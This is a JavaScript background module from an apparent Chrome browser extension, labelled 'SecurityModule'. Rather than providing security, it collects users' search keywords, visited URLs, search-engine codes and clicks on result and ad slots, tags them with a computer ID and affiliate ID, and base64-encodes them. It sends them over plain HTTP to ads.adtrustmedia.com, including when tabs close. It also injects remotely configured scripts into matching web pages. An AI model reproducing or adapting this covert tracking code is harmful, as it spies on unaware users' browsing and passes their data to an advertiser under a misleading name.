define(function (require) { 
    
    var exports = {};
    var Session = require('./backgroundSession').Session;
    var bgUtils = require('./backgroundUtils');
    var URI = require('./frameworks/uri').URI;
    var engineCodes = {
            'google': 'g_s',
            'yahoo': 'h_s',
            'bing': 'b_s',
            'about': 'a_s',
            'ask': 's_s',
            'yellowpages': 'y_s',
            'whitepages':  'w_s',
            'mywebsearch': 'm_s',
            'facebook': 'f_s'
        };

    function SecurityModule() {
        var activated = require('./localConfig').SECURITY_MODULE;
        this.config = {}, this.scripts = {};

        //initialization
        loadScript();
        sendOldDataFromStorage();

        //check close tabs
        setInterval(function() {
            sendDataFromDestroyTab();
        }, 5000);

        /**
        * public method
        * check status module
        * return boolean
        **/
        this.status = function () {
            if(!activated) {
                return false;
            }else {
                return true;
            }
        };

        /**
        * public method
        * initialization new tab
        **/
        this.sendTab = function (tabId) {
            if(!activated) return false;
            var tabs = loadTabs();

            if(tabs[tabId]) {
                send(tabs[tabId]);
                delete tabs[tabId];
                saveTabs(tabs);
            }
        };

        /**
        * public method
        * information from click
        **/
        this.setData = function (data) {
            if(!activated) return false;
            var tabs = loadTabs();
            var tab = tabs[data.tabId];

            if(!tab) {
                tabs = createTabInfo(data, tabs);
            }else if(tab.u != toBase64(data.u) || tab.kw != toBase64(data.kw)) {
                this.sendTab(data.tabId);
                tabs = createTabInfo(data, tabs);
            }else {
                tab['sc'].push(addClickSlot(data));
            }
            
            saveTabs(tabs);
        };

        /**
        * public method
        * load script for page
        **/
        this.getScript= function (url) {
            if(!activated) return false;
            var domain = URI.parse(url).host;
            var scriptText = '';

            if(this.config.e) {
                for(var i=0; i < this.config.e.length; i++) {
                    var reg = new RegExp(this.config.e[i].t, 'i');

                    if(reg.test(domain)) {
                        var pageScript = this.scripts[this.config.e[i].u];

                        if(!!pageScript){
                            scriptText = '(function(){ ' + Session.securityModule.preloadScript + '; ' + pageScript + ' UTILS.init();}());';
                        }
                    }
                }
            }

            return scriptText;
        };

        /**
        * public method
        * set config
        **/
        this.setConfig = function (data) {
            this.config = data;
        };

        /**
        * public method
        * set scripts
        **/
        this.saveScriptText = function (url, scriptText) {
            if(!this.scripts) {
                this.scripts = {};
            }
            this.scripts[url] = scriptText;
        };

        /**
        * private method
        * load content script
        **/
        function loadScript(data) {
            $.ajax({
              url: '/js/security_content.js',
              dataType: "text",
              success: function(data) {
                Session.securityModule.preloadScript = data;
              }
            });
        };

        /**
        * private method
        * create tab with data
        **/
        function createTabInfo(data, tabs) {
            tabs[data.tabId] = {
                'c': Session.computerId,
                'af': Session.affiliateId,
                'pv': Session.extVersion,
                'e': getEngineCode(data),
                'kw': toBase64(data.kw),
                'u': toBase64(data.u),
                's': data.s,
                'i' : ((typeof(data.i) == 'string') ? data.i.trim() : data.i),
                'sc': [addClickSlot(data)]
            };

            return tabs;
        };

        /**
        * private method
        * add click slot
        **/
        function addClickSlot(data) {
            var clickAd = {
               'x' : data.scx,
               't' : toBase64(data.sct),
               'd' : toBase64(data.scd),
               'u' : toBase64(data.scu),
               'p' : data.scp,
               's' : data.scs
            }

            return clickAd;
        };

        /**
        * private method
        * encode to base64
        **/
        function toBase64(str) {
            return btoa(unescape(encodeURIComponent(str.trim())));
        };

        /**
        * private method
        * send data to server
        **/
        function send(data) {
           $.ajax({
                url: 'http://ads.adtrustmedia.com/rsc.php',
                type: 'PUT',
                dataType: 'json',
                data: JSON.stringify(data)
            });
        };

        /**
        * private method
        * load tabs from localStarage
        * return tabs
        **/
        function loadTabs() {
            var tabs = localStorage.getItem('securityModuleData');
            if(!tabs) {
                return tabs = {};
            }
            return JSON.parse(tabs);
        };

        /**
        * private method
        * save tabs into localStarage
        **/
        function saveTabs(tabs) {
            localStorage.setItem('securityModuleData', JSON.stringify(tabs));
        };

        /**
        * private method
        * send data to server from local storage
        **/
        function sendOldDataFromStorage() {
           var tabs = loadTabs();
           
           for(tab in tabs) {
                send(tabs[tab]);
           }

           saveTabs({});
        };

        /**
        * private method
        * return engine code
        **/
        function getEngineCode(data) {
            var domain = URI.parse(data.u).host_without_www;
            var code = '';

            for(item in engineCodes) {
                if(domain.indexOf(item) >= 0) {
                    code = engineCodes[item];
                    break;
                }
            }

            return code;
        };

        /**
        * private method
        * send data to server if tab destroy
        **/
        function sendDataFromDestroyTab() {
            var tabsSecurityModule = loadTabs();

           //get all chrome windows
            chrome.windows.getAll(null, function(wins) {
                for (var j = 0; j < wins.length; ++j) {
                    //get all chrome tabs
                    chrome.tabs.query({'windowId': wins[j].id}, function(tabs) {
                        var tabDestroy = false,
                            tabArray = [];

                        for (var i = 0; i < tabs.length; ++i) {
                            tabArray.push(tabs[i].id);
                        }

                        for (i in tabsSecurityModule) {
                            if(tabArray.indexOf(i*1) < 0) {
                                tabDestroy = i;
                                break;
                            } 
                        }

                        if(tabDestroy) {
                            Session.securityModule.sendTab(tabDestroy);
                        }
                    });
                }
            });
        };

    }

    exports = SecurityModule;

return exports;

});
